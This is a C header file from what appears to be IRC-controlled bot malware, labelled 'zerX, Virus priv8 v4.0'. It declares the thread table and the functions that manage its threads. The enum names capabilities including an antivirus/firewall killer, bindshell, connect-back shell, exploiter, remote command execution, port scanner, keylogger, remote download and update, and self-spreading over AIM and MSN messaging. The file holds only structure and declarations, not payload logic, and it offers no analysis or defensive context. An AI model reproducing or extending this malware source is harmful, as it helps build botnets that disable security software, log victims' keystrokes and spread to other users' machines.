/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
enum {
	MAIN_THREAD,		// Main thread 
	KILLER_THREAD,		// Firewall/AV Killer thread
	IDENT_THREAD,		// Ident Server thread
	HTTP_THREAD,		// HTTP Server thread
	FTP_THREAD,         // FTPD Server thread; Added
	TFTP_THREAD,		// TFTP Server thread
	BINDSHELL_THREAD,	// Bindshell thread
	CONNBACK_THREAD,	// Connectback thread
	EXPL_THREAD,		// Exploiter thread
	RCMD_THREAD,		// Remote CMD thread
	SCAN_THREAD,		// Port Scanner thread
	TCP_THREAD,
	VISIT_THREAD,		// Visit URL thread
	DOWNLOAD_THREAD,	// Download thread
	UPDATE_THREAD,		// Update thread
	CLONE_THREAD,		// Clone thread
	KEYLOG_THREAD,		// Key Logger thread
	AIM_THREAD,			// Aim Spread
	TIM_THREAD,			// TriTon Spread
	MSNMSG_THREAD,		// Virus MSN SREAD
	LOG_THREAD,			// Log list thread
	PROC_THREAD,		// Process list thread
	LIST_THREAD			// Threads list thread
};

typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   SOCKET sock;
   SOCKET csock;
   HANDLE tHandle;
   char nick[MAXNICKLEN];

} THREAD;

typedef struct TLIST
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TLIST;


int addthread(char *name, int id, SOCKET sock);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);
